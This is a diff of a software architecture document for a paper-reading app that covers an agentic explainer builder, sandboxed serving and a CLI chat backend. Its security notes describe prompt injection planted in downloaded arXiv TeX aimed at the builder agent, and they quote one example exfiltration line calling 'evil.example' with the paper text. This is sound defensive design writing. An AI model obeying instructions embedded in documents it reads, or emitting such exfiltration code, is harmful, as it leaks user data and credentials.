@@ -42,7 +42,7 @@ paperpile-navigate/
     ├── src/
     │   ├── index.ts              # Express entry point, mounts 10 route modules
     │   ├── types.ts              # Mirrors client types + category constants
-    │   ├── routes/               # 10 RESTful route handlers
+    │   ├── routes/               # 11 RESTful route handlers
     │   └── services/             # Business logic (DB, ArXiv API, PDF, export, similarity)
     └── data/                     # Runtime data (gitignored)
         ├── papers.db             # SQLite database
@@ -52,13 +52,13 @@ paperpile-navigate/
 ### Client (`client/src/`)
 
 * **App.tsx** — Root component managing 6 view modes: `browse`, `library`, `authors`, `viewer`, `chatHistory`, `worldline`. Holds global state for papers, tags, and favorite authors. Initializes color scheme and font size from localStorage on mount.
-* **components/** — 18 components:
+* **components/** — 19 components:
   + `PaperBrowser` — Search/browse with category filters, query, pagination
   + `Library` — Saved papers list with tag/worldline/tier filters, multi-select bulk operations, unified import panel, and selection-driven export
   + `ImportPanel` — Tabbed panel combining ArXiv ID batch import, BibTeX import, and PDF upload
   + `PaperViewer` — Main reader: PDFViewer on left, tabbed sidebar (chat, comments, tags, export, info, worldline, import) on right. Supports immersive mode and browse-context navigation.
   + `PDFViewer` — react-pdf integration with page controls, search, annotations, and the trim-view menu (see Page Trimming below)
-  + `ChatPanel` — Conversation UI with markdown rendering and token usage display
+  + `ChatPanel` — Conversation UI: streamed markdown rendering, per-turn token/cost display, and the frozen context-mode badge (see Chat below)
   + `ChatHistory` — Lists all chat sessions per paper
   + `CommentPanel` — Per-page annotations with edit/delete
   + `TagPanel` — Add/remove tags on current paper
@@ -78,22 +78,23 @@ paperpile-navigate/
 
 ### Server (`server/src/`)
 
-* **index.ts** — Express entry point. CORS enabled, JSON body parser (10MB limit). Mounts 10 route modules under `/api`. Serves static client build from `client/dist/` in production with SPA fallback. Initializes database and PDF storage on startup.
+* **index.ts** — Express entry point. CORS enabled, JSON body parser (10MB limit). Mounts 11 route modules under `/api`. Serves static client build from `client/dist/` in production with SPA fallback. Initializes database and PDF storage on startup.
 * **routes/** — RESTful route handlers:
   + `arxiv.ts` — Search, categories, latest/recent papers, single paper fetch, PDF proxy (avoids CORS)
   + `papers.ts` — Full CRUD for saved papers + bulk operations (download-pdfs, delete-pdfs, delete, tier, add-tag, remove-tag) + sub-routes for comments and tags
   + `tags.ts` — Tag CRUD (name is UNIQUE)
-  + `chat.ts` — Claude AI proxy. Fetches PDF (cached 30min in memory), sends to Anthropic API with paper context and related worldline papers. Model: `claude-sonnet-4-20250514`, max_tokens: 2048. Also handles worldline-level chat (no PDF, titles + abstracts only) and API key verification.
+  + `chat.ts` — Paper and worldline chat as SSE streams: session priming/resume, persistence, and `GET /backend-status`. Also API key verification. See Chat below.
   + `authors.ts` — Favorite authors + batch-fetches recent publications (concurrency limit: 3)
   + `export.ts` — BibTeX and Paperpile JSON generation. Citation key format: `{LastName}{Year}{ArxivId}`. Embeds tags as keywords and comments as notes. Also streams a ZIP archive of selected local PDFs (`GET /api/export/pdfs?ids=`).
   + `worldlines.ts` — Worldline CRUD, paper assignment with position ordering, embedding similarity scoring + flag log/dismiss/stats (see Similarity System below), batch import from ArXiv
   + `settings.ts` — Key-value settings CRUD (API key, similarity threshold, etc.)
   + `scribe.ts` — Hands selected papers' PDFs off to the Scribe app (`http://localhost:3003`) and deletes them locally
   + `scout.ts` — Opus-5 listing triage: `POST /scan` (idempotent per listing), `GET /runs` (diagnostics). See Scout below.
+  + `walkthrough.ts` — generated interactive explainers: source manifest, outline, agentic build (202 + SSE), sandboxed bundle serving, vendored assets. See Walkthrough Mode below.
 * **services/** — Business logic layer:
   + `database.ts` — SQLite with better-sqlite3. WAL mode, foreign keys enabled. 40+ query functions, all parameterized. Schema created/migrated in `initializeDatabase()`.
   + `arxiv.ts` — ArXiv REST API client (`http://export.arxiv.org/api/query`). XML parsing via xml2js. Functions for search, author search, single paper fetch, latest (RSS), and recent (HTML scraping).
-  + `chat.ts` — Anthropic API integration with PDF base64 encoding and ephemeral prompt caching (`cache_control: { type: 'ephemeral' }`). Note: the Anthropic SDK is NOT a direct dependency — the server calls the Anthropic REST API via fetch, forwarding the API key from client-side settings.
+  + `chat.ts` — the chat engine: frozen prompts, the `claude -p` flag vector, context resolution (TeX → PDF → abstract), stream parsing, and the CLI session store. Neither backend uses the Anthropic SDK — the `api` path calls the REST API via fetch. See Chat below.
   + `pdf.ts` — PDF storage management under `server/data/pdfs/`. Download, store, delete, path resolution. ArXiv IDs escaped (`/` → `_`) for filenames.
   + `similarity.ts` — embedding backends + similarity orchestration; `similarity-core.ts` holds the pure, unit-testable decision logic (see Similarity System below).
   + `paperpile.ts` — BibTeX/Paperpile export formatting with author name parsing.
@@ -222,9 +223,179 @@ Two client-side files, no server work beyond one setting:
 
 **Verification:** `npm run verify:autotrim --prefix server` runs the detector and the aggregation over synthetic pages — no pdf.js, no canvas, no PDFs — covering measurement geometry, polarity independence (dark scans), blank/scrap rejection, dust erosion, marginal-stamp rejection (including each guard that keeps real margin content), and the never-clip property of the document box.
 
+### Walkthrough Mode (generated interactive explainers)
+
+**A short sequence of scenes that explain what a paper actually does, with live visuals you can manipulate — built by a model that has read the paper's LaTeX source rather than a rasterized page.** It sits between triage and study: the fast *"do I actually understand the mechanism"* pass on a paper Scout flagged. It does not replace reading; it decides whether reading is worth it. Plan and rationale: `walkthrough-mode.md`.
+
+**Why TeX source, not the PDF.** The PDF is a *rendering*; the source is what the rendering was made from. Everything a builder needs and a PDF reader must reconstruct is present verbatim: `\begin{equation}` with `\label` instead of glyph runs, `\newcommand` definitions instead of per-occurrence inference, explicit `\section` structure instead of font-size heuristics. Measured on `1706.03762`: the source package is 1.15 MB gzipped and distills to **40 KB / ~10k tokens** — one comfortable call. Distillation is therefore about **fidelity, not cost**.
+
+**Five stages.**
+
+```
+1. acquire  services/texsource.ts   arXiv /e-print → cached, path-safe source tree
+2. distill  services/texdistill.ts  tree → flattened TeX + structure + figures     [pure]
+3. outline  services/walkthrough.ts distilled → scene outline JSON (cheap, editable, can say "none")
+4. build    services/walkthrough.ts outline → self-contained bundle.html (agentic `claude -p`)
+5. serve    routes/walkthrough.ts   sandboxed iframe + strict CSP
+```
+
+`texdistill.ts` is **pure and dependency-free** — no DB, no network, no model, not even a Node builtin — the same way `similarity-core.ts` is. That is what makes the fiddliest part of the feature, LaTeX heterogeneity, unit-testable against fixtures.
+
+**Stage 1 — acquire.** `https://arxiv.org/e-print/<id>` 301s to `/src/<id>` and *always* answers `content-type: application/gzip`; **the content type does not tell you the container.** The classifier is `content-disposition`'s filename, confirmed by magic bytes after gunzip: `arXiv-1706.03762v7.tar.gz` → gzipped tar; `arXiv-hep-th9711200v3.gz` → a **bare gzipped single file** whose gzip header preserves the original name (`conffo.tex`); `….pdf` → a PDF-only submission with no source. The filename also carries the version actually served (`v7`), recorded because a walkthrough is built against a specific version. Fetched through `arxivFetch` with a new **`'src'` gate (2 s, its own queue)**, not a raw `fetch`.
+
+The **tar reader is hand-rolled**, not a dependency: the format is simple, and writing it means the path-safety guarantees are enforced by code that is directly unit-testable. Extraction rejects `..`, absolute paths, drive letters and NUL bytes, skips symlinks/hard links/device nodes/FIFOs outright, re-checks the resolved path against the destination root before writing a byte, and caps per-file (20 MB), total (200 MB) and download (50 MB) sizes. Only `.tex/.sty/.cls/.bbl/.bib/.txt` plus rasters are written; **every** entry name is still recorded, because figure resolution needs to know `figure1` was a `.pdf` even though the `.pdf` was skipped. Cache lives at `DATA_DIR/tex/<escaped id>/`, LRU-evicted on a byte budget.
+
+**Fallback chain, probed not assumed:** source package → arXiv's LaTeXML HTML at `/html/<id>` (broad coverage but *not* universal, larger than the TeX, and it has already lost the macros) → title + abstract only, marked degraded in the UI.
+
+**Stage 2 — distill.** Output: `{mainFile, flattenedTex, macros, structure, labels, figures, citations, warnings}`.
+
+* **Main-file detection**, in order: the only `.tex` → a file with `\documentclass` → a file with `\begin{document}` → **the largest `.tex`**. The last tier is not laziness: `hep-th/9711200` is plain TeX with harvmac and contains **neither**. Files that something else `\input`s are excluded from the candidate pool first.
+* **`\input`/`\include` resolution** — recursive, depth-capped, cycle-detected, with the TeX extension rule and the plain-TeX `\input name` form. Missing targets are warnings, never failures (`\input harvmac` is normal — arXiv supplies it). ⚠️ The `\input` regex is built by a **factory, not a shared `/g` constant**: `expand()` recurses from inside its own `exec` loop, and a shared `lastIndex` rewinds the outer scan and re-expands forever ("Invalid string length" on a real paper). There is a regression guard for this.
+* **Comment stripping** respecting `\%`, `\verb` and verbatim environments. Author comments are a *liability*, not lost context — 10 of the 26 greppable `\newcommand`s in `1706.03762` are commented-out, including a block that redefines `\kq` differently. Stripping first is why the distiller reports **16 macros, and 16 is the right answer.**
+* **Macro capture** — `\newcommand`/`\renewcommand`/`\providecommand`/`\def`/`\let`/`\DeclareMathOperator`/`\newenvironment`, kept **verbatim and hoisted to the top**. They are never expanded: the model reads a definition better than a half-correct expander rewrites its forty uses, and a wrong expansion is silent. A resolved `\input` target that is *all* definitions contributes its macros but not its text.
+* **Structure map** includes harvmac's `\newsec`/`\subsec` — without them the plain-TeX physics papers that force the main-file fallback distill to a structure map of length zero.
+* **Citations** come from `.bib`, `.bbl` **and an inline `\begin{thebibliography}`** — `1706.03762` ships all 40 of its entries that way. `\cite{key}` markers survive the bibliography's removal so a scene can name the work it replaces.
+* **Budget** (`MAX_TEX_CHARS`, 400k): appendices first, then proof bodies, then experimental-detail sections, recording exactly what was dropped.
+
+**Stage 3 — outline (the gate).** One structured `claude -p` call (Opus 5, medium effort, `--json-schema`) returning `{fitness: {verdict, reason}, thesis, scenes[]}`. The prompt asks *what specific object in this paper is worth manipulating and what would the reader learn by manipulating it* — **not** "design a visualization". If it cannot name the object and the lesson, the answer is `none`.
+
+⚠️ **Every visual is required to be interactive; a designed *static* diagram has no category.** The outline prompt asks what is worth *manipulating*, `visual.spec` must name the reader's *control*, `CONTRACT.md` is a contract for an "interactive explainer", and `normalizeOutline` forces `kind: 'none'` on a `none` verdict. "Static" appears only as the WebGL fallback and as figures lifted from the paper. The consequence is that papers whose contribution is *structural* — an architecture, a construction, a proof skeleton — fall to prose, exactly where one good diagram would help most. This is a deliberate choice with a stated rationale (a fixed vocabulary converges to a template), not a bug, but it is under review: see *Static visuals — an unresolved gap* in `walkthrough-mode.md`, which proposes an orthogonal `visual.mode` and the four-paper A/B that has to run before anything changes.
+
+**`fitness: "none"` is a first-class, correct outcome.** A model asked to animate an arbitrary paper will *always* produce something; for a benchmark-table-and-ablation paper that something is a spinning cube beside a restated abstract — a dollar spent to teach nothing, and a confident-looking artifact that misrepresents the paper. A `none` verdict still builds, as prose + equations + static figures, at a fraction of the cost. `normalizeOutline` is the trust boundary (Scout's `normalizeFindings` role): scenes capped at **8**, equation labels not in the paper's own label list dropped, fitness enum validated, and a `none` verdict cannot smuggle an animated scene through.
+
+**The outline is editable before you pay for the build.** That is the main quality lever in the feature, so it exists from the start. Editing a never-built row updates it in place; editing a `ready` row **forks a new row**, because a previous build is sometimes the better one and re-rolling must not destroy it.
+
+**Stage 4 — build (agentic).** `claude -p --model claude-opus-5 --effort high --tools Read,Write,Edit --permission-mode acceptEdits --append-system-prompt <untrusted-input warning> --max-budget-usd <cap> --output-format stream-json --include-partial-messages --verbose --setting-sources "" --no-session-persistence --strict-mcp-config`.
+
+⚠️ **The builder gets no shell and does not bypass permissions, and this is a security boundary rather than a preference.** It reads `paper.tex`, which is **third-party text downloaded from arXiv** — anyone can put words in it, including words shaped like instructions to the agent reading them. The plan originally specified `--tools Read,Write,Edit,Bash --permission-mode bypassPermissions` so the agent could run its own smoke check; that is prompt-injection straight to arbitrary command execution as the user (`~/.ssh`, the stored API key, anything this account can read). Note the bundle's `connect-src 'none'` does **nothing** here: it constrains the *bundle at view time*, not the *builder at build time*. `acceptEdits` auto-approves edits inside the scratch dir and leaves anything outside it to a permission prompt, which under `-p` is a refusal — that is the "writable surface is the scratch dir only" checklist item actually enforced instead of assumed from cwd.
+
+* **cwd is a fresh scratch dir** (`DATA_DIR/walkthroughs/<id>/build-<n>/`), never the repo — Claude Code auto-discovers `CLAUDE.md` by walking up, and Scout measured that mistake at 10,835 vs 602 cached tokens. **Do not "fix" this with `--bare`**: it reads auth strictly from `ANTHROPIC_API_KEY`/`apiKeyHelper` and can never bill the Claude Code plan.
+* **`--verbose` is mandatory**, not optional: the CLI refuses `--output-format stream-json` under `-p` without it.
+* **`--setting-sources ""`** keeps the run hermetic (no ambient settings, no `SessionStart` hooks) and, verified 2026-08-28, does **not** break plan auth.
+* **No `--system-prompt`** — unlike Scout's, this genuinely *is* a coding session, so Claude Code's own agent prompt is what you want. The instructions are `CONTRACT.md` in the scratch dir.
+* **The prompt must stay consistent with `--tools`.** `BUILD_PROMPT` is the *last* thing the agent reads, so a stale instruction there outranks `CONTRACT.md`. This drifted once — Bash was removed from `--tools` while step 5 still said "Run `node smoke.mjs`" — and a live build spent 11 minutes heading for an instruction it could never satisfy. `--tools` is now derived from `BUILDER_TOOLS`, and `verify:walkthrough` asserts the prompt names no shell command.
+* **The artifact outranks the exit code.** `runCli` no longer fails a build just because the CLI exited non-zero: the exit code describes the *run*, `collectBundle` describes the *artifact*, and we hold an independent authoritative validator (no external origins, valid structure, every script parses). A bundle that passes all of it is usable however the process ended. Measured: a run exited 1 after writing a 79 KB bundle that passed every check, and $2.07 of paid work was discarded unexamined because the exit code was consulted first. A non-zero exit *with* an unusable bundle still fails, and skips the repair round-trip (the run's own error is the better diagnostic).
+* **Progress must distinguish slow from stuck.** A refused `Write` and a slow `Write` look identical if only tool *calls* are streamed, so `interpretStreamLine` also forwards tool **results** (`user` messages carrying `tool_result`; `is_error` becomes a visible `✗` line), and each invocation emits a **60-second heartbeat** carrying elapsed minutes, the last tool seen, and whether `bundle.html` exists on disk yet — the ground truth for whether writing works at all.
+* **The smoke check runs server-side**, in `collectBundle` + `checkScriptSyntax` — which was the authoritative gate anyway, and now cannot be skipped or faked by the agent. `node --check` only parses, never executes, so running it on generated code is safe. A failure buys **one bounded repair round-trip**, funded from what is *left* of the user's cap rather than a second full cap (a ceiling you can exceed by retrying is not a ceiling). That recovers the self-correction the tool loop was for without handing a shell to text a stranger wrote.
+* `--max-budget-usd` is the guardrail that makes an agentic loop safe behind a button (there is no `--max-turns` in CLI 2.1.247). Default $1.50, a setting.
+
+**The contract, helper library and stylesheet are real files in `server/assets/walkthrough/`** — readable, syntax-checkable, diffable — and **their combined sha256 is `CONTRACT_VERSION`, which feeds the cache key.** Editing any of them correctly invalidates every future build instead of silently mixing outputs built to different rules. `wt.js` (scene stepper, sliders, hidpi 2D axes, MathJax wiring, theme variables, WebGL fallback) is **inlined** into each bundle, so a built walkthrough is frozen against later helper changes.
+
+**Stage 5 — serve.** `GET /api/walkthrough/row/:id/bundle`, rendered in `<iframe sandbox="allow-scripts">` with **`allow-same-origin` deliberately absent**, putting generated code in an opaque origin with no access to the app's DOM, storage, cookies or API session. Response CSP: `default-src 'none'; script-src 'self' 'unsafe-inline' <origin>/api/walkthrough/asset/; style-src 'unsafe-inline'; img-src 'self' data: blob: <origin>; connect-src 'none'; frame-ancestors 'self'; base-uri 'none'; form-action 'none'`. **`connect-src 'none'` is the one that matters** — the paper's content cannot be exfiltrated by generated code.
+
+The asset origin is named explicitly as well as by `'self'`, because a sandboxed document's origin is opaque and whether `'self'` resolves there is not worth betting the feature on. It is derived from the `Host` header, which is why **`client/vite.config.ts` sets `changeOrigin: false`** — rewriting Host would emit a CSP for `:3001` while the page loads from `:5173`.
+
+three.js and MathJax are **vendored via npm and served from `/api/walkthrough/asset/`**, never a CDN.
+
+⚠️ **MathJax is pinned to v3 (`es5/tex-svg.js`), and the major version is load-bearing.** MathJax **4** splits its fonts into chunks it fetches from `cdn.jsdelivr.net` *at typeset time*; the bundle's CSP correctly refuses them, whereupon MathJax throws `dynamic file '…' failed to load` and **abandons typesetting entirely**, leaving raw `\(…\)` on screen in every walkthrough. v3 compiles the whole font into the one file, so SVG output genuinely needs no network. `wt.js` additionally sets `loader: { load: [], paths: { mathjax: '/api/walkthrough/asset' } }` so nothing even tries to reach a CDN.
+
+⚠️ **`svg: { fontCache: 'local' }`, never `'global'`.** With `'global'` MathJax keeps every glyph path in a single body-level `<svg id="MJX-SVG-global-cache">` and each equation carries only `<use>` references into it. That element sits *outside* every scroll container the page owns (`.wt-stage`, `.wt-equation`, `mjx-container` all clip; a body-level sibling of `.wt-root` does not), so when it painted, glyphs rendered at raw font coordinates across the whole pane on top of the content. `'local'` inlines each equation's `<defs>` into its own `<svg>` — self-contained, with no shared element to go wrong — at a cost of ~7 KB per equation against a 2 MB MathJax, which is nothing. `wt.css` also hard-hides `#MJX-SVG-global-cache` so its absence is enforced rather than assumed. `verify:walkthrough` pins the major version and asserts the vendored file contains no lazy font loader — a "vendored" library that phones home is not vendored, and inside the sandbox that failure is silent and total rather than degraded.
+
+⚠️ **The asset route must not send `Cache-Control: immutable`.** `/api/walkthrough/asset/<name>` carries no version, so its *contents* change whenever the pinned dependency does. It was originally `max-age=31536000, immutable`, which meant swapping MathJax 4 for 3 changed nothing for any browser that had already opened a walkthrough — it kept the old bytes for a year and kept rendering raw `\(…\)`, making a correct fix look like no fix at all. `immutable` is only ever safe on a content-addressed URL. The route sends `no-cache` (revalidate, *not* "don't cache"); `sendFile`'s ETag makes each check a 304, so the 2 MB body is not resent.
+
+**The bundle is scanned for external origins before it is written**, belt-and-braces with the CSP. ⚠️ The scanner treats `//` as a line comment **only at the start of a line**: anywhere else it is far more likely to open a protocol-relative URL inside a string — `fetch("//evil.example/exfil?d=" + paperText)` — and honouring it as a comment made the scanner blind to exactly the exfiltration it exists to catch. The asymmetry is deliberate; the contract tells the builder not to write URLs in comments at all.
+
+**Narrow `postMessage` protocol**, validated on both ends. iframe → app: `ready`, `error`, `gotoPage`. app → iframe: `theme`, `setScene`. Nothing else is honored. The frame is in an opaque origin so `event.origin` is `"null"`; identity is established by comparing `event.source` to the frame's `contentWindow`. CSS custom properties do not cross an iframe boundary, so the app **sends** its resolved `--mono-*` palette rather than relying on inheritance, and re-sends it when the theme changes.
+
+**Job model.** A build is minutes and dollars, so it cannot be a blocking request. `POST /api/walkthrough/build/:arxivId` → `202 {jobId}`; `GET /api/walkthrough/job/:jobId/stream` is SSE fed from the CLI's `stream-json` (stages, tool calls, text deltas — thinking deltas are **not** forwarded). In-process registry, **concurrency capped at 1**.
+
+⚠️ **A server restart kills a running build, and this bites in ordinary development**: `tsx watch` restarts the server the moment any server source file is saved. `initializeDatabase()` reaps the orphaned `building` *row* to `failed`, and `runCli` installs a `process.on('exit'|'SIGINT'|'SIGTERM'|'SIGHUP')` reaper that kills the orphaned *subprocess* — without it the child survives its parent and burns the rest of its budget producing a bundle nothing will ever collect. **Do not edit server sources while a build is running.**
+
+**Idempotency, Scout's rule:** identical source + identical outline + identical contract ⇒ the stored bundle, no model call. ⚠️ The row's `cache_key` **must be the outline-derived key**, not a "seed" key computed before the outline existed — otherwise the build pass recomputes a different key, never hits the cache, and every press of Build silently pays for a fresh agentic run. That bug existed and started an unintended build; there is a regression guard for it at both the key and row-store level. "Have I already outlined this source?" is answered by an `arxiv_id` + `source_sha` scan instead.
+
+**Routes are action-first** (`/build/:arxivId`, not `/:arxivId/build`) because arXiv ids contain slashes: `hep-th/9711200` under a greedy wildcard would swallow a trailing segment.
+
+**Rows have no foreign key to `papers`**, deliberately, for the reason `paper_archive` has none: a walkthrough is expensive and must survive the paper being handed to Scribe or deleted. Multiple rows per paper are expected; the newest `ready` row is what the viewer opens, with older ones reachable and individually deletable.
+
+**UI.** `PaperViewer` gets a three-way pane toggle — **PDF only / split / walkthrough only** — not a new top-level `ViewMode`, so the whole sidebar (chat, comments, worldline) stays live beside the walkthrough. Split is the mode that makes a walkthrough genuinely useful: the point of an explainer is checking it against the paper.
+
+⚠️ **Nothing may typeset in a hidden pane.** MathJax sizes its SVG output from measured font metrics — `nodeSize()` reads `offsetWidth`/`offsetHeight` off test nodes — and inside a zero-size subtree those measure 0, the derived `ex` collapses, and every equation is emitted with an enormous `ex` width whose glyphs the viewBox then scales up to sprawl across the page. Because `pdf` is the default mode, mounting the walkthrough pane eagerly meant *every* bundle typeset its first scene while `display: none`. Two independent guards: `WalkthroughPane` is **lazily mounted** (only once its pane has been shown, and stays mounted after), and `wt.js` gates `WT.typeset` behind `whenSized()`, which waits on a `ResizeObserver` for a non-zero `clientWidth` with **no timeout** — if the page is never shown, waiting costs nothing, whereas giving up and typesetting anyway reproduces the bug. The symptom is distinctive: only the *first* scene is affected (later ones typeset while visible), and inline math sprawls furthest because `<p>` has no clipping while `.wt-equation` does.
+
+**Both panes stay mounted in every mode** once shown, hidden with CSS rather than unmounted. Remounting would re-fetch and re-parse the PDF, lose its scroll position, and reload the walkthrough's iframe from scratch (MathJax and all) — precisely the cost you notice when flipping back and forth, which is what the toggle is for. This is safe because `PDFViewer` carries a `ResizeObserver` and its `fitToWidth` already ignores a zero-width container, so hiding and re-showing refits it. Note `.viewer-pdf` sets `flex-direction: column` on the same element, so `.viewer-panes` must state `row` explicitly. Under 900px split stacks vertically — two 300px columns of a paper is worse than either alone.
+
+The toggle is icon-only, and the icons are the layout itself (left-filled / split / right-filled) rather than a document-vs-sparkle pairing, so it reads without labels in an already-crowded header. `currentPage` is shared, so a scene's `gotoPage` drives the real PDF viewer; from walkthrough-only it promotes to split rather than hiding the walkthrough the reader was just in. Uploads (`upload-*`) can never have a walkthrough, so the toggle is hidden and the mode forced to `pdf` — otherwise the reader could be stranded in a pane with no control to leave it. The chosen layout otherwise persists across papers. `Library` shows a `◈` badge; `PaperBrowser` can offer (never trigger) a walkthrough on Scout findings above a score. **There is no bulk build** — a per-paper agentic run is exactly how a cost surprise happens.
+
+**Cost, measured** (not estimated): the outline pass on `1706.03762` cost **$0.319** and 51 s on the `cli` backend — above the plan's $0.15–0.20 guess. Per-run token counts and cost are stored per stage (`outline_cost`, `build_cost`) and shown in the pane header, prefixed `≈` on the CLI backend where the figure is the **list-price equivalent** of plan-billed work, not money charged to an API account. `GET /api/walkthrough/runs` is the spend history.
+
+**Verification:** `npm run verify:walkthrough --prefix server` — 144 checks over an isolated temp data dir, no network, no model: package classification for all three measured shapes, tar path-safety against a hand-built hostile archive, the four main-file tiers, `\input` nesting/cycles/missing targets, comment stripping, macro capture and hoisting, budget truncation order, `normalizeOutline`, cache-key identity (including the seed-key regression), the external-origin scanner, both CLI flag vectors, scratch-dir seeding (including that no API key reaches it), stream-event interpretation, and the builder's capability set (no Bash, no permission bypass, untrusted-input warning present).
+
+### Chat (`claude -p`, TeX source context, Opus 5)
+
+**Reading a paper with a model that has the paper's LaTeX source, resuming one CLI conversation across the whole reading session.** Three changes that only make sense together (full rationale and the live measurements: `chat-overhaul.md`).
+
+**Why TeX and not the PDF.** Same paper (`1706.03762`), same question, both answered correctly: the base64 PDF costs **34,820** prefix tokens, the flattened source **17,291** — half, and the half that survives is the author's macros, `\label`led equations, explicit `\section` structure and theorem environments rather than page images. So chat is the *second* consumer of `texsource.ts` + `texdistill.ts`, and by far the more frequent one; nothing about the pipeline is walkthrough-specific.
+
+What TeX gives up, honestly: **figure images** (the model sees `\caption` text and a filename), and **page numbers** — LaTeX has no pagination, so the prompt tells the model to cite sections and equation labels and never to guess a page. TikZ figures arrive as source, which is usually *more* informative than the rendering. Attaching raster figures alongside is possible (the stream-json input takes `image` blocks the same way it takes `document`) and deliberately not done: an unconditional figure attachment gives back most of the 2x.
+
+**Why the CLI and not the REST API.** Its prompt cache is **1-hour** TTL (`cache_creation.ephemeral_1h_input_tokens`) against the API's 5 minutes — and reading a paper is exactly the pacing that defeats a 5-minute cache: send a message, read for ten minutes, send another. On the API path every such message re-writes the entire paper. And on a Claude Code plan the work is plan-billed rather than charged to metered credits.
+
+⚠️ **The one hazard is prefix identity, and a miss is silent.** Measured on one message: replaying the prompt verbatim cost 152 cache-creation / 43,832 cache-read tokens ($0.0058); omitting `--system-prompt` on the resume — which falls back to Claude Code's default agent prompt — cost 50,347 / 0 ($0.1015). **17x, no error raised.** Everything that shapes the prefix (system prompt, `--model`, `--tools`, `--effort`) is therefore **frozen on the session row at its first message and replayed verbatim**, never rebuilt per request. `system_prompt` is the load-bearing column: the prompt embeds the paper's worldline siblings, so rebuilding it meant adding the paper to a thread mid-conversation silently changed the prefix.
+
+**Flow.**
+
+```
+POST /api/chat  { sessionId, message, paperContext }   → SSE
+  │
+  ├─ session has system_prompt?
+  │    no  → resolve context (tex|pdf|abstract), freeze prompt + model + backend
+  │          spawn: claude -p --input-format stream-json --session-id <uuid> --system-prompt <frozen> …
+  │          stdin: one NDJSON user message = [context block, transcript replay?, user text]
+  │    yes → spawn: … --resume <uuid> --system-prompt <frozen, verbatim>
+  │          stdin: the user text alone — the paper is not re-sent
+  │
+  └─ stream text deltas to the client; persist both messages and the usage from the `result` event
+```
+
+One process per message: no long-lived subprocess to manage, no restart-recovery problem, and `total_cost_usd` comes back **per invocation** (within one process it accumulates across turns, which would have made per-message accounting wrong).
+
+**Flag vector** (`buildChatArgs()`, exported for the harness exactly as Scout exports `buildCliArgs`):
+
+```
+-p --input-format stream-json --output-format stream-json --include-partial-messages --verbose
+   --model <chatModel> --effort <chatEffort> --tools ""
+   --system-prompt <frozen>  --setting-sources ""  --strict-mcp-config
+   (--session-id <uuid> | --resume <uuid>)
+```
+
+* `--input-format stream-json` is what lets a `document` block reach the model at all (verified with `--tools ""`, so no Read tool and no 20-page pagination). It requires `--output-format stream-json`, which in turn **requires `--verbose`** — the CLI refuses to start otherwise.
+* **No `--no-session-persistence`.** Resume needs the session on disk; that is the entire mechanism.
+* `--setting-sources ""` keeps the run hermetic and suppresses the ambient `SessionStart` hooks that otherwise fire on every message. Verified (in the walkthrough builder) not to break plan auth, unlike `--bare` — which must **never** be used here: it reads auth strictly from `ANTHROPIC_API_KEY`/`apiKeyHelper` and can never bill the plan.
+* **We cannot send our own `cache_control`.** It passes validation, but the CLI already places four breakpoints and a fifth is a hard `400 A maximum of 4 blocks with cache_control may be provided. Found 5.` The prefix is cached regardless.
+* **A stored transcript cannot be replayed as history.** Supplied `assistant` messages in the input stream are not adopted — the CLI answers each streamed `user` message itself. `--resume` is the only cheap path.
+
+⚠️ **The subprocess's cwd must have no `CLAUDE.md` on any ancestor.** Claude Code auto-discovers `CLAUDE.md` by walking *up* from its working directory, and `--system-prompt` does not suppress it; Scout measured that mistake at 10,835 vs 602 cached tokens ($0.11 vs $0.008) for an identical trivial prompt. But the cwd must also be **stable**, because the CLI keys its session store off it (`~/.claude/projects/<slugified cwd>/<uuid>.jsonl`) and `--resume` only finds a session from the directory that created it. `DATA_DIR/chat-sessions/` satisfies stability but not cleanliness: with `SUITE_DATA_ROOT` unset, `DATA_DIR` falls back to `server/data/`, **inside this repo**, three levels under a `CLAUDE.md`. So `chatSessionsCwd()` actually walks the ancestor chain and falls back to a tmpdir when it is polluted, rather than assuming.
+
+**Context modes** — `tex` → `pdf` → `abstract`, resolved once and then frozen, because switching would invalidate the CLI session and its cache. `pdf` covers PDF-only arXiv submissions and **every uploaded paper** (`upload-*` ids have no arXiv source by construction, so uploads skip the TeX attempt entirely). `abstract` is today's silent fallback, now surfaced: the panel shows the mode as a badge, with the degraded one styled to be noticed.
+
+**Re-priming replays the transcript.** A session created before this backend existed (`system_prompt IS NULL`), or one whose CLI session file is gone (`~/.claude` cleaned, machine changed), is primed fresh — and the stored transcript rides into the priming message as a `<conversation-so-far>` block, oldest turns dropped first under a 20k-char cap. The alternative (display-only, never replayed) means the model visibly forgets everything with no explanation the user can see. It costs a few hundred tokens once and rides *after* the paper context block, so the cached paper prefix is unaffected.
+
+⚠️ **Freeze the model you *asked* for, never the one the envelope reports.** The CLI's `result` event carries `modelUsage`, which enumerates every model the session touched — including the small background model Claude Code uses for its own housekeeping — in no meaningful order. Recording `Object.keys(modelUsage)[0]` on the session made turn 2 of a live conversation resume as Haiku: the wrong model answering, *and* a guaranteed cache miss on top, since `--model` is part of the prefix. `interpretChatStreamLine` therefore exposes no model at all, so there is nothing to freeze by mistake.
+
+⚠️ **Client-disconnect detection hangs off the response, not the request.** `req.on('close')` fires when the request *body* stream ends, which on a POST whose body has already been read is immediately — so the abort watch killed every model call the moment it started. It is `res.on('close')` guarded by `!res.writableEnded`, which separates "we finished" from "they left".
+
+**Instrumentation.** A resume that reports `cache_read_input_tokens == 0` has silently paid to re-send the whole paper. It should be impossible — the prompt is replayed verbatim from the row — so when it happens the turn logs a warning server-side and surfaces one in the UI. This is the single most valuable piece of instrumentation in the feature.
+
+**Worldline chat is the same code path**, not a parallel one: same frozen prompt, same `--session-id`/`--resume`, same SSE, with the thread's titles and abstracts in the system prompt and no separate context block (`fixedMode: 'abstract'`). Sharing the path is the point — a prefix-identity bug cannot exist in one and not the other.
+
+**Streaming.** `--include-partial-messages` gives token-by-token deltas, so `/api/chat` is SSE and `ChatPanel` renders progressively; **thinking deltas are deliberately not forwarded** (the user asked about a paper, not to watch the model deliberate). `EventSource` cannot POST, so the client reads the response body directly. Aborting the fetch kills the subprocess server-side, so a closed panel stops paying.
+
+**The client no longer sends the transcript.** `POST /api/chat` takes `{ sessionId, message, paperContext }`; the server owns the conversation and persists both messages as part of the turn, so nothing is uploaded afterwards. Sessions are serialized per id by an in-process lock — two `--resume`s of one uuid at once corrupt it.
+
+**Session reaping.** The CLI writes a transcript per conversation and nothing else prunes them. Deleting a chat session (or all of a paper's) reaps its `<uuid>.jsonl` directly; startup runs an age sweep scoped to the chat cwd's own project slug, over files no live session references. Both only ever unlink a file named exactly by a uuid this server generated, so a wrong slug guess can do no damage.
+
